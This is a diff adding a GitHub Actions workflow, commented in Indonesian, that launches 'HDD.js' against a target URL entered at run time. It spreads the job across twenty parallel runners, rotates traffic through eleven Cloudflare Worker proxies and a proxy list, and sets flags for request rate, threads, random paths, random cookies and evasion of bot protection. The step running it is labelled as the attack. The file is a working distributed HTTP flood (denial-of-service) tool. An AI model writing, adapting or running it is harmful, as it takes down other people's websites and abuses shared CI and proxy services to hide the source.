@@ -1,0 +1,98 @@
+name: Run HDD.js with Worker Rotation
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        required: true
+        type: string
+        description: "Target URL"
+      rate:
+        required: true
+        type: number
+        description: "Rate (RPS)"
+      time:
+        required: true
+        type: number
+        description: "Duration (seconds)"
+      threads:
+        required: true
+        type: number
+        description: "Threads"
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      # 1. Ambil file dari repo (termasuk HDD.js dan proxy.txt)
+      - uses: actions/checkout@v4
+      
+      # 2. Setup Node.js
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          
+      # 3. Install dependensi (wajib karena node_modules tidak ada di repo)
+      - name: Install npm dependencies
+        run: npm install hpack axios http2-wrapper
+      
+      # 4. Beri izin eksekusi pada script (kalau belum)
+      - name: Make script executable
+        run: chmod +x HDD.js
+      
+      # 5. Pilih Worker Cloudflare secara acak
+      - name: Prepare Worker List
+        id: worker_sel
+        run: |
+          # Daftar 11 worker
+          WORKERS=(
+            "https://noisy-pine-708c.kikkk8022.workers.dev/?url="
+            "https://super-rice-2b3b.kikkk8022.workers.dev/"
+            "https://steep-mouse-8705.kikkk8022.workers.dev/"
+            "https://solitary-hall-c937.kikkk8022.workers.dev/"
+            "https://broad-sea-6cc2.kikkk8022.workers.dev/"
+            "https://snowy-glitter-16cc.kikkk8022.workers.dev/"
+            "https://noisy-mountain-87f1.kikkk8022.workers.dev/"
+            "https://shiny-morning-2b8b.kikkk8022.workers.dev/"
+            "https://aged-lab-735b.kikkk8022.workers.dev/"
+            "https://blue-frog-0993.kikkk8022.workers.dev/"
+            "https://wispy-math-b156.kikkk8022.workers.dev/"
+          )
+          # Pilih acak berdasarkan shard + timestamp
+          SHARD_INDEX=${{ matrix.shard }}
+          RANDOM_INDEX=$(( (SHARD_INDEX + $(date +%s)) % 11 ))
+          SELECTED_WORKER=${WORKERS[$RANDOM_INDEX]}
+          echo "selected_worker=$SELECTED_WORKER" >> $GITHUB_OUTPUT
+          echo "Worker selected: $SELECTED_WORKER"
+      
+      # 6. Jalankan serangan
+      - name: Run HDD.js with parameters
+        run: |
+          # Gabungkan URL dengan worker
+          WORKER_URL="${{ steps.worker_sel.outputs.selected_worker }}"
+          TARGET_URL="${{ inputs.url }}"
+          FULL_URL="${WORKER_URL}${TARGET_URL}"
+          
+          # Jalankan HDD.js
+          node HDD.js \
+            GET \
+            "$FULL_URL" \
+            "${{ inputs.time }}" \
+            "${{ inputs.threads }}" \
+            "${{ inputs.rate }}" \
+            proxy.txt \
+            --full true \
+            --bfm true \
+            --legit true \
+            --ratelimit true \
+            --delay 50 \
+            --referer "$FULL_URL" \
+            --httpver "h2" \
+            --randpath true \
+            --uam true \
+            --cookie "%RAND%" \
+            --header ":method@GET#:authority@${{ inputs.url }}#:scheme@https#referer@${FULL_URL}#origin@${{ inputs.url }}#accept@text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9#upgrade-insecure-requests@1#accept-encoding@gzip,deflate#accept-language@en-US,en;q=0.9#cache-control@no-cache,no-store,must-revalidate#pragma@no-cache#expires@0"
